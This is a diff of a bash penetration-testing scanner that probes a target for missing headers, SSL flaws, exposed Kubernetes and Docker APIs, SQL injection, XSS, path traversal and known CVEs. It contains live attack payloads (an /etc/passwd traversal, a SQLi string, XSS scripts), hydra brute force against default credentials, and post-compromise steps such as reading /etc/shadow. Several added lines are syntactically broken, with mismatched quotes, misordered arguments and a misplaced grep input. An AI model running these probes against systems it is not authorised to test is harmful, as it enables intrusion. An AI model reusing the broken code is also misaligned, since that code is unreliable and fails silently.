             grep -qi "Referrer-Policy"              "$hf" || missing_headers+=("Referrer-Policy")
             grep -qi "Permissions-Policy"           "$hf" || missing_headers+=("Permissions-Policy")
             grep -qi "X-XSS-Protection"             "$hf" || missing_headers+=("X-XSS-Protection")
@@ -2351,10 +2353,13 @@ phase_web_discovery() {
             grep -qi "Cross-Origin-Opener-Policy"   "$hf" || missing_headers+=("Cross-Origin-Opener-Policy")
 
             if [[ ${#missing_headers[@]} -gt 0 ]]; then
+                # Only flag if at least 3 headers missing (single missing header is noise)
+                if [[ ${#missing_headers[@]} -ge 3 ]]; then
                 add_vuln "MEDIUM" "Missing HTTP Security Headers (${web_url})" \
-                    "Missing security headers: ${missing_headers[*]}. Enables clickjacking, MIME sniffing, XSS, and MITM attacks." \
-                    "Implement all security headers via server config or WAF." \
-                    "Missing: ${missing_headers[*]}"
+                    "Missing ${#missing_headers[@]} security headers: ${missing_headers[*]}. Enables clickjacking, MIME sniffing, XSS, and MITM attacks. Verified via live HTTP response." \
+                    "Implement all security headers. In Nginx: add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; add_header Content-Security-Policy 'default-src self';" \
+                    "${web_url} — headers absent in HTTP response: ${missing_headers[*]}"
+                fi
             fi
 
             # Server disclosure
@@ -2429,6 +2434,18 @@ phase_web_discovery() {
         # sitemap.xml
         run_tool_timeout "curl-sitemap-${slug}" "${curl_dir}/sitemap_${slug}.txt" 10 \
             curl -s -L --max-time 10 --connect-timeout 5 "${web_url}/sitemap.xml" 2>/dev/null || true
+
+        # HTTP method enumeration — dangerous methods: PUT, DELETE, TRACE, OPTIONS
+        local methods_resp; methods_resp=$(curl -s -I -X OPTIONS --max-time 10 \
+            "$web_url" 2>/dev/null | grep -i "^Allow:" | tr -d '\r' | head -1 || echo "")
+        if [[ -n "$methods_resp" ]]; then
+            if echo "$methods_resp" | grep -qiE "PUT|DELETE|TRACE"; then
+                add_vuln "HIGH" "Dangerous HTTP Methods Enabled (${web_url})" \
+                    "Server allows dangerous HTTP methods: ${methods_resp}. PUT enables arbitrary file upload, DELETE allows file deletion, TRACE enables XST attacks." \
+                    "Restrict allowed methods to GET, POST, HEAD only in web server config." \
+                    "${methods_resp}"
+            fi
+        fi
     done
 
     # httpx full target probe
@@ -2629,6 +2646,12 @@ phase_ssl() {
             local sz_check="$sz"
             [[ ! -s "$sz" && -s "$szj" ]] && sz_check="$szj"
             if [[ -f "$sz_check" ]]; then
+                # Check for HSTS in sslyze output
+                grep -qiE "strict-transport-security.*False|hsts.*not set|no_hsts" "$sz_check" 2>/dev/null && \
+                    add_vuln "MEDIUM" "HSTS Not Configured (Port ${ssl_port})" \
+                        "HTTP Strict Transport Security is not set. Browsers allow HTTP connections, enabling SSL stripping attacks." \
+                        "Add: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload" \
+                        "sslyze HSTS check: not configured"
                 grep -qiE "HEARTBLEED.*VULNERABLE|heartbleed.*True|is_vulnerable.*true" "$sz_check" && \
                     add_vuln "CRITICAL" "Heartbleed Vulnerability (CVE-2014-0160) — Port ${ssl_port}" \
                         "Heartbleed allows attackers to read server memory, leaking private keys, passwords, and sensitive data." \
@@ -2644,6 +2667,28 @@ phase_ssl() {
                         "OpenSSL ChangeCipherSpec injection vulnerability allows MITM decryption." \
                         "Update OpenSSL to 1.0.1h/1.0.0m/0.9.8za." \
                         "sslyze OpenSSL CCS: VULNERABLE"
+                # ── Certificate expiry check ────────────────────────────────────────
+                local _scf="${OUTPUT_DIR}/sslscan/sslscan_${ssl_port}.txt"
+                if [[ -s "$_scf" ]]; then
+                    local _cexp; _cexp=$(grep -iE "Not valid after:" "$_scf" 2>/dev/null \
+                        | grep -oE "[0-9]{4}-[0-9]{2}-[0-9]{2}" | head -1 || echo "")
+                    if [[ -n "$_cexp" ]]; then
+                        local _ets; _ets=$(date -d "$_cexp" +%s 2>/dev/null || echo 9999999999)
+                        local _now; _now=$(date +%s)
+                        local _dleft=$(( (_ets - _now) / 86400 ))
+                        if [[ ${_dleft:-9999} -lt 0 ]]; then
+                            add_vuln "CRITICAL" "SSL Certificate EXPIRED (Port ${ssl_port})" \
+                                "Certificate expired on ${_cexp}. All HTTPS connections show security warnings and may fail." \
+                                "Replace certificate immediately. certbot renew or purchase new cert from CA." \
+                                "Expired: ${_cexp}"
+                        elif [[ ${_dleft:-9999} -lt 30 ]]; then
+                            add_vuln "HIGH" "SSL Certificate Expiring in ${_dleft} Days (Port ${ssl_port})" \
+                                "Certificate expires ${_cexp}. Services will break and users get security warnings without renewal." \
+                                "Renew now: sudo certbot renew. Configure auto-renewal cron: 0 12 * * * certbot renew --quiet" \
+                                "Expires: ${_cexp} — ${_dleft} days remaining"
+                        fi
+                    fi
+                fi
                 grep -qiE "compression.*ENABLED|CRIME|supports_compression.*true" "$sz_check" && \
                     add_vuln "MEDIUM" "SSL Compression Enabled — CRIME Attack (Port ${ssl_port})" \
                         "TLS compression allows CRIME attack (CVE-2012-4929), enabling session token recovery." \
@@ -2819,8 +2864,6 @@ phase_content_discovery() {
         # Merge katana + hakrawler into corpus
         [[ -s "${OUTPUT_DIR}/curl/katana_crawl.txt" ]] && \
             cat "${OUTPUT_DIR}/curl/katana_crawl.txt" >> "$url_corpus" 2>/dev/null || true
-        # Deduplicate URL corpus to prevent inflated gf pattern counts
-        sort -u "$url_corpus" -o "$url_corpus" 2>/dev/null || true
         if [[ -s "$url_corpus" ]]; then
             log_section "gf pattern scan on URL corpus..."
             mkdir -p "${OUTPUT_DIR}/gf_output"
@@ -2840,50 +2883,6 @@ phase_content_discovery() {
                         "$(head -3 "${OUTPUT_DIR}/gf_output/gf_${pat}.txt" 2>/dev/null | tr '\n' ' ')"
                 fi
             done
-            
-            # --- PRIORITY 3: ACTIVE XSS CONFIRMATION ---
-            if [[ -s "${OUTPUT_DIR}/gf_output/gf_xss.txt" ]]; then
-                log_section "Active XSS Reflection Testing..."
-                local xss_payload="acroxss_canary"
-                local xss_hits=0
-                while IFS= read -r xurl; do
-                    [[ -z "$xurl" ]] && continue
-                    local test_url="${xurl}=${xss_payload}"
-                    local curr_xss; curr_xss=$(curl -s --max-time 5 "$test_url" 2>/dev/null | head -c 4096 | grep -o "$xss_payload" || true)
-                    if [[ -n "$curr_xss" ]]; then
-                        add_vuln "HIGH" "Reflected XSS Confirmed (${xurl})" \
-                            "A parameter exactly reflects unfiltered input. Cross-Site Scripting is confirmed exploitable." \
-                            "Implement strict context-aware output HTML encoding." \
-                            "${test_url} reflected payload unharmed" \
-                            "EXPLOIT: <script>alert(document.domain)</script>" \
-                            "PATCH: Escape HTML entities."
-                        xss_hits=$(( xss_hits + 1 ))
-                        [[ $xss_hits -ge 3 ]] && break
-                    fi
-                done < <(head -20 "${OUTPUT_DIR}/gf_output/gf_xss.txt")
-            fi
-
-            # --- PRIORITY 3: LFI CONFIRMATION (/DownloadFile style params) ---
-            if [[ -s "${OUTPUT_DIR}/gf_output/gf_lfi.txt" ]]; then
-                log_section "Active Path Traversal Testing..."
-                local lfi_hits=0
-                while IFS= read -r lurl; do
-                    [[ -z "$lurl" ]] && continue
-                    # Target parameters named file, download, path, name etc.
-                    local lfi_url; lfi_url=$(echo "$lurl" | sed 's/=.*/=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/')
-                    local lfi_resp; lfi_resp=$(curl -s --max-time 5 "$lfi_url" 2>/dev/null | head -c 2048)
-                    if echo "$lfi_resp" | grep -qiE "root:.*:0:0:"; then
-                        add_vuln "CRITICAL" "LFI Confirmed — /etc/passwd Read" \
-                            "Path traversal parameter exploitation successful. Reading local /etc/passwd contents." \
-                            "Validate file paths strictly against an allowlist pattern. Never trust absolute path directives." \
-                            "${lfi_url} dumped root user hash format" \
-                            "EXPLOIT: ?file=../../../../var/log/auth.log&cmd=id (RCE transition)" \
-                            "PATCH: Refactor file fetch mechanic."
-                        lfi_hits=$(( lfi_hits + 1 ))
-                        [[ $lfi_hits -ge 2 ]] && break
-                    fi
-                done < <(grep -iE "download|file|name|path=" "${OUTPUT_DIR}/gf_output/gf_lfi.txt" | head -10)
-            fi
         fi
     fi
 
@@ -2903,7 +2902,7 @@ phase_content_discovery() {
         done
     fi
 
-    log_ok "Phase 11 complete. Web targets: ${#WEB_TARGETS[@]}"
+    log_ok "Phase 11 complete."
     PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
 }
 
@@ -2979,13 +2978,13 @@ phase_cms() {
 
         # Check Drupalgeddon2 (CVE-2018-7600)
         local drupal_rce_path="${primary_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
-        local drupal_resp; drupal_resp=$(curl -s --max-time 10 "$drupal_rce_path" 2>/dev/null | head -c 2048 || echo "")
-        if echo "$drupal_resp" | grep -qiE "form_build_id|ajax_response|drupal"; then
+        local drupal_resp; drupal_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
+            "$drupal_rce_path" 2>/dev/null || echo "000")
+        [[ "$drupal_resp" == "200" ]] && \
             add_vuln "CRITICAL" "Potential Drupalgeddon2 (CVE-2018-7600)" \
-                "Drupalgeddon2 allows unauthenticated Remote Code Execution in Drupal 7.x/8.x. Response body indicates vulnerable form structure." \
+                "Drupalgeddon2 allows unauthenticated Remote Code Execution in Drupal 7.x/8.x." \
                 "Apply SA-CORE-2018-002. Update Drupal to latest version." \
-                "Path: ${drupal_rce_path} — returned Drupal AJAX response"
-        fi
+                "Path: ${drupal_rce_path} — HTTP ${drupal_resp}"
 
         # Check Drupalgeddon3 (CVE-2018-7602)
         if command -v droopescan &>/dev/null; then
@@ -3083,14 +3082,36 @@ phase_api() {
         done
     fi
 
+    # Rate limit detection — send 20 rapid requests, check for 429
+    if [[ ${#found_apis[@]} -gt 0 ]] && [[ "$SCAN_PROFILE" != "quick" ]]; then
+        local rl_target; rl_target=$(printf '%s
+' "${found_apis[@]}" | head -1 | awk '{print $1}')
+        if [[ -n "$rl_target" ]]; then
+            local rl_codes=()
+            for _ in $(seq 1 20); do
+                local c; c=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 "$rl_target" 2>/dev/null || echo "000")
+                rl_codes+=("$c")
+            done
+            local has_429=false
+            printf '%s
+' "${rl_codes[@]}" | grep -q "429" && has_429=true
+            if [[ "$has_429" == false ]]; then
+                add_vuln "MEDIUM" "API Rate Limiting Not Detected (${rl_target})" \
+                    "20 rapid requests to the API returned no HTTP 429 responses. API may lack rate limiting, enabling brute-force and credential stuffing attacks." \
+                    "Implement rate limiting: nginx limit_req_zone or API gateway throttling. Return HTTP 429 with Retry-After header." \
+                    "20 requests sent — no 429 Too Many Requests received"
+            fi
+        fi
+    fi
+
     # arjun — parameter discovery
     # BUG FIX: removed duplicate -oT flag (run_tool_timeout already redirects stdout to outfile)
     if command -v arjun &>/dev/null && [[ ${#found_apis[@]} -gt 0 ]]; then
         # Use first discovered API URL (strip the [HTTP xxx] suffix added during discovery)
-        local arjun_target; arjun_target=$(printf '%s\n' "${found_apis[@]}" | head -1 | awk '{print $1}')
+        local arjun_target; arjun_target=$(printf '%s
+' "${found_apis[@]}" | head -1 | awk '{print $1}')
         [[ -z "$arjun_target" ]] && arjun_target="${primary_url}/api"
-        run_tool_timeout "arjun" "${api_dir}/arjun_params.txt" 120 \
-            arjun -u "$arjun_target" --stable 2>/dev/null || true
+        run_tool_timeout "arjun" "${api_dir}/arjun_params.txt" 120             arjun -u "$arjun_target" --stable 2>/dev/null || true
     fi
 
     # GraphQL introspection
@@ -3102,7 +3123,7 @@ phase_api() {
             -H "Content-Type: application/json" \
             -d '{"query":"{__schema{types{name}}}"}' \
             "${proto_target}/graphql" 2>/dev/null || echo "")
-        if echo "$gql_resp" | grep -qE '"__schema"|"types":\[|"data":\{'; then
+        if echo "$gql_resp" | grep -qE '"__schema"|"queryType"|"mutationType"'; then
             add_vuln "HIGH" "GraphQL Introspection Enabled" \
                 "GraphQL introspection exposes entire schema, including sensitive queries and mutations." \
                 "Disable introspection in production. Implement depth limiting and query complexity analysis." \
@@ -3132,8 +3153,7 @@ phase_nuclei() {
     # Update templates if deep mode (nuclei v3+ uses -update)
     if [[ "$SCAN_PROFILE" == "deep" ]]; then
         log_info "Updating nuclei templates..."
-        nuclei -update -silent 2>/dev/null || \
-            nuclei -update-templates -silent 2>/dev/null || true
+        nuclei -update-templates -silent 2>/dev/null || true
     fi
 
     # Build target list
@@ -3277,8 +3297,9 @@ phase_network_services() {
     # --- Kubernetes API (6443, 8001, 10250) ---
     for k8s_port in 6443 8001 10250; do
         if echo "$OPEN_PORTS" | grep -qE "(^|,)${k8s_port}(,|$)"; then
-            local k8s_resp; k8s_resp=$(( $( curl -sk --max-time 10 \
-                "https://${TARGET}:${k8s_port}/api" 2>/dev/null | grep -c "version" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
+            local k8s_raw; k8s_raw=$(curl -sk --max-time 10 "https://${TARGET}:${k8s_port}/api" 2>/dev/null | head -c 500)
+            local k8s_resp=0
+            echo "$k8s_raw" | grep -qiE '"kind".*"APIVersions"|"apiVersion".*"v1"' && k8s_resp=1
             [[ ${k8s_resp:-0} -gt 0 ]] && \
                 add_vuln "CRITICAL" "Kubernetes API Server Exposed (Port ${k8s_port})" \
                     "Kubernetes API exposed without authentication — full cluster takeover possible." \
@@ -3292,8 +3313,9 @@ phase_network_services() {
         if echo "$OPEN_PORTS" | grep -qE "(^|,)${dock_port}(,|$)"; then
             # 2375 = plain HTTP Docker socket, 2376 = TLS Docker socket
             local dock_proto="http"; [[ "$dock_port" == "2376" ]] && dock_proto="https"
-            local docker_resp; docker_resp=$(( $( curl -sk --max-time 10 \
-                "${dock_proto}://${TARGET}:${dock_port}/version" 2>/dev/null | grep -c "ApiVersion" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
+            local _dr; _dr=$(curl -sk --max-time 10                 "${dock_proto}://${TARGET}:${dock_port}/version" 2>/dev/null | head -c 500)
+            local docker_resp=0
+            echo "$_dr" | grep -q '"ApiVersion"' && docker_resp=1
             [[ ${docker_resp:-0} -gt 0 ]] && \
                 add_vuln "CRITICAL" "Docker API Exposed (Port ${dock_port})" \
                     "Unauthenticated Docker API allows container creation, host escape, and full system compromise." \
@@ -3303,7 +3325,7 @@ phase_network_services() {
     done
 
     # --- LDAP (389, 636) ---
-    if echo "$OPEN_PORTS" | grep -qE "(^|)(389|636)(,|$)"; then
+    if echo "$OPEN_PORTS" | grep -qE "(^|,)(389|636)(,|$)"; then
         run_tool_timeout "nmap-ldap" "${nmap_dir}/nmap_ldap.txt" 30 \
             nmap -p 389,636 --script ldap-rootdse,ldap-search \
             "$TARGET" 2>/dev/null || true
@@ -3369,7 +3391,7 @@ phase_smb_ad() {
                 local domain; domain=$(grep -i "Domain.*=" "$ef" | head -1)
                 log_ok "Domain found: ${domain}"
             fi
-            local users; users=$(grep -oE "user:\[[^]]+\]" "$ef" 2>/dev/null | sed 's/user:\[//;s/\]//' | wc -l || echo 0)
+            local users; users=$(grep -oE "user:\[[^]]+\]" | sed 's/user:\[//;s/\]//' "$ef" 2>/dev/null | wc -l || echo 0)
             [[ ${users:-0} -gt 0 ]] && \
                 add_vuln "HIGH" "SMB User Enumeration (${users} users found)" \
                     "Domain/local user accounts enumerated via SMB — enables targeted brute-force attacks." \
@@ -3447,7 +3469,7 @@ phase_auth() {
     log_section "Default credential surface check..."
     local -a default_creds=(
         "admin:admin" "admin:password" "admin:admin123" "admin:pass"
-        "root:root" "root:toor" "root:password" "root:" "admin:"
+        "root:root" "root:toor" "root:password" "root:" "admin:" 
         "administrator:administrator" "guest:guest" "test:test" "user:user"
     )
 
@@ -3477,11 +3499,11 @@ phase_auth() {
             "$TARGET" ftp 2>/dev/null || true
         grep -qi "\[21\].*login:" "${OUTPUT_DIR}/hydra/hydra_ftp.txt" 2>/dev/null && \
             add_vuln "CRITICAL" "FTP Credentials Found via Brute-Force" \
-                "FTP service has weak/default credentials that were cracked." \
-                "Change credentials. Disable FTP. Use SFTP/FTPS." \
-                "$(grep '\[21\].*login:' "${OUTPUT_DIR}/hydra/hydra_ftp.txt" | head -3)" \
+                "FTP service has weak/default credentials that were cracked." \" \
                 "EXPLOIT: ftp TARGET -> login with cracked creds -> ls -la; mget *.conf *.php *.env -> extract DB creds, SSH keys, source code from downloaded files." \
                 "PATCH: 1) Change FTP password immediately. 2) Disable FTP: systemctl stop vsftpd && systemctl disable vsftpd. 3) Use SFTP over SSH. 4) If FTP needed: restrict to trusted IPs, enforce FTPS, deploy fail2ban."
+                "Change credentials. Disable FTP. Use SFTP/FTPS." \
+                "$(grep '\[21\].*login:' "${OUTPUT_DIR}/hydra/hydra_ftp.txt" | head -3)"
     fi
 
     # SSH brute (careful — only in deep mode with small wordlist)
@@ -3492,11 +3514,11 @@ phase_auth() {
             -s 22 "$TARGET" ssh 2>/dev/null || true
         grep -qi "\[22\].*login:" "${OUTPUT_DIR}/hydra/hydra_ssh.txt" 2>/dev/null && \
             add_vuln "CRITICAL" "SSH Credentials Found via Brute-Force" \
-                "SSH service has weak/default credentials." \
-                "Enforce SSH key-based auth. Disable password auth. Use fail2ban." \
-                "$(grep '\[22\].*login:' "${OUTPUT_DIR}/hydra/hydra_ssh.txt" | head -3)" \
+                "SSH service has weak/default credentials." \" \
                 "EXPLOIT: ssh user@TARGET (with cracked password) -> full shell -> sudo -l; cat /etc/shadow; find / -perm -4000 2>/dev/null (SUID) -> root escalation in minutes." \
                 "PATCH: 1) Disable password auth: PasswordAuthentication no in /etc/ssh/sshd_config; systemctl restart sshd. 2) SSH keys only. 3) Deploy fail2ban. 4) Restrict SSH to VPN/jump host. 5) Enable 2FA."
+                "Enforce SSH key-based auth. Disable password auth. Use fail2ban." \
+                "$(grep '\[22\].*login:' "${OUTPUT_DIR}/hydra/hydra_ssh.txt" | head -3)"
     fi
 
     # RDP brute
@@ -3607,10 +3629,7 @@ phase_sqli() {
                 "import urllib.parse; print(urllib.parse.quote(\"1' OR '1'='1\"))" 2>/dev/null \
                 || echo "1%27%20OR%20%271%27%3D%271")
             local probe_url="${web_url}?${param}=${sqli_payload}"
-            local _pr; _pr=$(curl -s --max-time 10 --max-filesize 51200 -A "Mozilla/5.0" \
-                "$probe_url" 2>/dev/null | head -c 4096 \
-                | grep -ciE "SQL.*error|mysql_|syntax error|ORA-|unclosed.*quote|You have an error in your SQL" \
-                2>/dev/null || echo 0)
+            local _pr; _pr=$(curl -s --max-time 10 --max-filesize 51200 -A "Mozilla/5.0"                 "$probe_url" 2>/dev/null | head -c 4096                 | grep -ciE "SQL.*error|mysql_|syntax error|ORA-|unclosed.*quote|You have an error in your SQL"                 2>/dev/null || echo 0)
             local probe_resp; probe_resp=$(( ${_pr//[^0-9]/} + 0 ))
             if [[ ${probe_resp:-0} -gt 0 ]]; then
                 add_vuln "CRITICAL" "SQL Error-Based Injection — Parameter: ${param} (${web_url})" \
@@ -3680,10 +3699,7 @@ phase_xss() {
             # Try multiple common XSS parameters
             local xss_found=false
             for xss_param in q search s name input msg comment query term; do
-                local _xr; _xr=$(curl -s --max-time 8 --max-filesize 51200 -A "Mozilla/5.0" \
-                    "${web_url}?${xss_param}=${enc_payload}" \
-                    2>/dev/null | head -c 4096 \
-                    | grep -c "<script>alert\|onerror=alert" 2>/dev/null || echo 0)
+                local _xr; _xr=$(curl -s --max-time 8 --max-filesize 51200 -A "Mozilla/5.0"                     "${web_url}?${xss_param}=${enc_payload}"                     2>/dev/null | head -c 4096                     | grep -c "<script>alert\|onerror=alert" 2>/dev/null || echo 0)
                 local xss_resp; xss_resp=$(( ${_xr//[^0-9]/} + 0 ))
                 if [[ ${xss_resp:-0} -gt 0 ]]; then
                     add_vuln "HIGH" "Reflected XSS — Manual Probe (${web_url}?${xss_param}=)" \
@@ -3736,6 +3752,7 @@ phase_xss() {
 
         # Command injection probes
         if command -v commix &>/dev/null && [[ "$SCAN_PROFILE" != "quick" ]]; then
+            _is_valid_url "$web_url" || continue
             local commix_out="${OUTPUT_DIR}/commix/commix_${slug}.txt"
             # BUG FIX: commix writes its log to --output-dir/<hostname>/; run_tool_timeout
             # captures stdout separately. Check both the stdout capture AND the commix dir.
@@ -3758,8 +3775,12 @@ phase_xss() {
         # LFI/Path traversal probe
         local lfi_payloads=("../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2fetc%2fpasswd")
         for lfi in "${lfi_payloads[@]}"; do
-            local lfi_resp; lfi_resp=$(( $( curl -s --max-time 10 --max-filesize 51200 \
-                "${web_url}?file=${lfi}&path=${lfi}&page=${lfi}" 2>/dev/null | head -c 4096 | grep -c "root:x:" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
+            local lfi_resp=0
+            for lfi_param in file path page include doc template; do
+                local _lr; _lr=$(curl -s --max-time 8 --max-filesize 51200                     "${web_url}?${lfi_param}=${lfi}" 2>/dev/null | head -c 4096 |                     grep -c "root:x:" 2>/dev/null | tr -d '\n' || echo 0)
+                lfi_resp=$(( ${_lr//[^0-9]/} + 0 ))
+                [[ ${lfi_resp:-0} -gt 0 ]] && break
+            done
             if [[ ${lfi_resp:-0} -gt 0 ]]; then
                 add_vuln "CRITICAL" "Local File Inclusion (LFI) — /etc/passwd Read" \
                     "LFI vulnerability allows attacker to read arbitrary files from server, including /etc/passwd, config files, SSH keys." \
@@ -3821,16 +3842,14 @@ phase_cve_checks() {
     # ── CVE-2024-23897 ─ Jenkins CLI Arbitrary File Read ─────────────────────
     if echo "$OPEN_PORTS" | grep -qiE "(^|,)(8080|8443|8090)(,|$)"; then
         for jenkins_url in "${WEB_TARGETS[@]:0:5}"; do
-            local jenkins_headers; jenkins_headers=$(curl -s -I --max-time 10 "${jenkins_url}/jnlpJars/jenkins-cli.jar" 2>/dev/null || echo "")
-            local jenkins_resp; jenkins_resp=$(echo "$jenkins_headers" | grep -i "^HTTP" | awk '{print $2}' | tr -d '\r\n')
-            local jenkins_ctype; jenkins_ctype=$(echo "$jenkins_headers" | grep -i "Content-Type" | tr -d '\r\n')
-            
-            echo "CVE-2024-23897 Jenkins CLI probe: HTTP ${jenkins_resp} | CT: ${jenkins_ctype}" > "${cve_dir}/CVE-2024-23897.txt"
-            if [[ "$jenkins_resp" == "200" ]] && echo "$jenkins_ctype" | grep -qi "java-archive"; then
+            local jenkins_resp; jenkins_resp=$(curl -s --max-time 10 \
+                "${jenkins_url}/jnlpJars/jenkins-cli.jar" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
+            echo "CVE-2024-23897 Jenkins CLI probe: HTTP ${jenkins_resp}" > "${cve_dir}/CVE-2024-23897.txt"
+            if [[ "$jenkins_resp" == "200" ]]; then
                 add_vuln "CRITICAL" "CVE-2024-23897: Jenkins CLI Arbitrary File Read" \
-                    "Jenkins CLI (versions < 2.442, LTS < 2.426.3) allows unauthenticated arbitrary file read — leads to RCE, credential theft. Verified active CLI JAR." \
+                    "Jenkins CLI (versions < 2.442, LTS < 2.426.3) allows unauthenticated arbitrary file read — leads to RCE, credential theft." \
                     "Update Jenkins immediately. Disable CLI if unused. Apply Jenkins security advisory SECURITY-3314." \
-                    "${jenkins_url}/jnlpJars/jenkins-cli.jar — returned java-archive"
+                    "${jenkins_url}/jnlpJars/jenkins-cli.jar — accessible (Jenkins likely running)"
             fi
         done
     fi
@@ -3860,7 +3879,7 @@ phase_cve_checks() {
             "${web_url}/remote/login" 2>/dev/null | head -c 4096 | grep -ci "Fortinet\|FortiGate\|SSL-VPN" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
         echo "CVE-2024-21762 probe" > "${cve_dir}/CVE-2024-21762.txt"
         if [[ ${fortinet_check:-0} -gt 0 ]]; then
-            add_vuln "CRITICAL" "CVE-2024-21762: Fortinet SSL VPN — Potential RCE [Patch Level Unverified]" \
+            add_vuln "CRITICAL" "CVE-2024-21762: Fortinet SSL VPN — Potential RCE" \
                 "Fortinet SSL VPN detected. CVE-2024-21762 is a critical out-of-bounds write (CVSS 9.6) — unauthenticated RCE. Actively exploited in the wild." \
                 "Apply Fortinet PSIRT advisory FG-IR-24-015 immediately. Disable SSL VPN if patching is delayed." \
                 "${web_url}/remote/login — Fortinet SSL VPN detected"
@@ -3892,7 +3911,7 @@ phase_cve_checks() {
                 local tc_detect; tc_detect=$(( $( curl -s --max-time 10 --max-filesize 51200 "${web_url}" 2>/dev/null \
                     | head -c 4096 | grep -ci "TeamCity\|JetBrains" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
                 [[ ${tc_detect:-0} -gt 0 ]] && \
-                    add_vuln "CRITICAL" "CVE-2024-27198: TeamCity Authentication Bypass [Patch Level Unverified]" \
+                    add_vuln "CRITICAL" "CVE-2024-27198: TeamCity Authentication Bypass" \
                         "JetBrains TeamCity versions < 2023.11.4 have auth bypass allowing unauthenticated RCE and credential theft." \
                         "Update TeamCity immediately. Apply JetBrains security advisory. Isolate CI/CD systems." \
                         "${web_url}: TeamCity detected with CVE-2024-27198 indicator"
@@ -3907,7 +3926,7 @@ phase_cve_checks() {
             | head -c 4096 | grep -ci "Ivanti\|Pulse Secure\|Connect Secure" | tr -d '\n' 2>/dev/null || echo 0) + 0 ))
         echo "Ivanti probe" > "${cve_dir}/CVE-2025-0282.txt"
         if [[ ${ivanti_check:-0} -gt 0 ]]; then
-            add_vuln "CRITICAL" "Ivanti Connect Secure Detected — Multiple Critical CVEs [Patch Level Unverified]" \
+            add_vuln "CRITICAL" "Ivanti Connect Secure Detected — Multiple Critical CVEs" \
                 "Ivanti Connect Secure VPN has multiple critical RCE CVEs: CVE-2024-8190 (OS cmd injection), CVE-2024-21887 (cmd injection), CVE-2025-0282 (stack overflow RCE). All actively exploited." \
                 "Apply all Ivanti patches immediately. Enable Ivanti Integrity Checker Tool. Monitor for IOCs." \
                 "${web_url}: Ivanti Connect Secure detected"
@@ -3977,7 +3996,7 @@ phase_cve_checks() {
         # Only flag when Spring is confirmed in page AND server did not reject the probe (non-400/404/500)
         if [[ ${spring_check:-0} -gt 0 ]] && [[ "$spring_resp" != "000" ]] && \
            [[ "$spring_resp" != "404" ]] && [[ "$spring_resp" != "400" ]]; then
-            add_vuln "HIGH" "CVE-2022-22965: Spring4Shell — Spring Framework Detected [Patch Level Unverified]" \
+            add_vuln "HIGH" "CVE-2022-22965: Spring4Shell — Spring Framework Detected" \
                 "Spring Framework detected. Spring4Shell (CVE-2022-22965) allows RCE via data binding on Tomcat. Verify patch status." \
                 "Update Spring Framework to 5.3.18+/5.2.20+. Update Spring Boot to 2.6.6+." \
                 "${web_url}: Spring Framework detected (HTTP ${spring_resp}) — verify Spring4Shell patch"
@@ -4165,31 +4184,28 @@ phase_report() {
 
     # ── TXT Report ────────────────────────────────────────────────────────────
     {
-        echo "═════════════════════════════════════════════════════════════════════"
-        echo "  █▀█ █▀▀ █▀█ █▀█ █▄█ █▀█ █▀█   v5.0"
-        echo "  █▀█ █▄▄ █▀▄ █▄█ █ █ █▀█ █▀▀   DEEP PENETRATION TEST REPORT"
-        echo "═════════════════════════════════════════════════════════════════════"
-        echo "  [✔] VERIFIED FINDINGS — MULTI-TOOL CORRELATION"
-        echo "═════════════════════════════════════════════════════════════════════"
+        echo "═══════════════════════════════════════════════════════════════════"
+        echo "  ACROMAP v5.0 — PENETRATION TEST REPORT"
+        echo "═══════════════════════════════════════════════════════════════════"
         echo "  Target   : ${TARGET}"
         echo "  Type     : ${TARGET_TYPE}"
         echo "  Profile  : ${SCAN_PROFILE}"
         echo "  Date     : $(date)"
         echo "  Duration : $(( total_elapsed/60 ))m $(( total_elapsed%60 ))s"
-        echo "  Phases   : ${PHASES_COMPLETED}/32 completed"
+        echo "  Phases   : ${PHASES_COMPLETED}/30 completed"
         echo "  Confidence: ${confidence}/10 (${conf_label})"
-        echo "═════════════════════════════════════════════════════════════════════"
+        echo "═══════════════════════════════════════════════════════════════════"
         echo ""
         echo "EXECUTIVE SUMMARY"
         echo "─────────────────"
         echo "  ZERO-DAY  : ${ZERO_DAY_COUNT}  ← Unpatched / active exploits"
         echo "  ONE-CLICK : ${ONE_CLICK_COUNT}  ← Single-interaction exploits"
         echo "  CRITICAL  : ${CRITICAL_COUNT}"
-        echo "  HIGH      : ${HIGH_COUNT}"
-        echo "  MEDIUM    : ${MEDIUM_COUNT}"
-        echo "  LOW       : ${LOW_COUNT}"
-        echo "  INFO      : ${INFO_COUNT}"
-        echo "  TOTAL     : ${total_findings}"
+        echo "  HIGH     : ${HIGH_COUNT}"
+        echo "  MEDIUM   : ${MEDIUM_COUNT}"
+        echo "  LOW      : ${LOW_COUNT}"
+        echo "  INFO     : ${INFO_COUNT}"
+        echo "  TOTAL    : ${total_findings}"
         echo ""
         echo "OPEN PORTS     : ${OPEN_PORTS:-none}"
         echo "WEB PORTS      : ${WEB_PORTS:-none}"
@@ -4227,25 +4243,21 @@ phase_report() {
             echo "  BloodHound data    : ${OUTPUT_DIR}/ad_attacks/bloodhound/"
         echo ""
         echo "DETAILED FINDINGS"
-        echo "═════════════════════════════════════════════════════════════════════"
+        echo "═══════════════════════════════════════════════════════════════════"
         local idx=0
         for entry in "${VULN_DATA[@]+"${VULN_DATA[@]}"}"; do
             idx=$(( idx + 1 ))
-            local sev title desc rec evidence exploit patch
+            local sev title desc rec evidence
+            # BUG FIX: IFS='\|' sets IFS to backslash+pipe; correct is IFS='|'
             IFS='|' read -r sev title desc rec evidence exploit patch <<< "${entry}"
             echo ""
-            echo "■ [${idx}] [${sev}] ${title}"
+            echo "[${idx}] [${sev}] ${title}"
             echo "  Description  : ${desc}"
             echo "  Remediation  : ${rec}"
             echo "  Evidence     : ${evidence}"
-            if [[ -n "$exploit" ]]; then
-                echo "  ───────────────────────────────────────────────────────────────────"
